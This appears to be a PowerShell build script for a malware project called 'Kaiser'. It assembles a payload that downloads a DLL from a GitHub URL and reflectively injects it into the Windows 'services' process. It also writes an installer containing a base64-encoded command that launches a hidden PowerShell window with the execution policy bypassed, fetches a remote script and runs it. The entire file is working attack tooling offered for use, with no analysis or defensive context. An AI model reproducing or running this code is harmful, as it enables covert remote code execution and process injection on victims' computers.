# Write reflective injector script.
$payload = [IO.File]::ReadAllText(".\Invoke-ReflectivePEInjection.ps1")

# Downloader for the DLL.
$payload += "`n" + @'
$PEBytes = (New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/NtRaiseHardError/Kaiser/KaiserDownloaderTest/Kaiser.dll")
'@

# Write the command for Invoke-ReflectivePEInjection.ps1
# We want to inject into the second csrss SessionId
$payload += "`n" + 'Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName services'
$payload | Out-File -Encoding ASCII -FilePath ".\Payload.ps1" -Force

# This is the downloader code containing Payload.ps1.
$downloader = @'
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NtRaiseHardError/Kaiser/KaiserDownloaderTest/Payload.ps1")
'@

# Write it out to a file that can be downloaded and executed.
$installer = '$cmd = ''' + $pshome + '\powershell.exe -nop -w Hidden –ep Bypass -enc ' + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($downloader)) + "'`n`n"
$installer += [IO.File]::ReadAllText(".\Install-Kaiser.ps1")
$installer | Out-File -Encoding ASCII -FilePath ".\Installer.ps1" -Force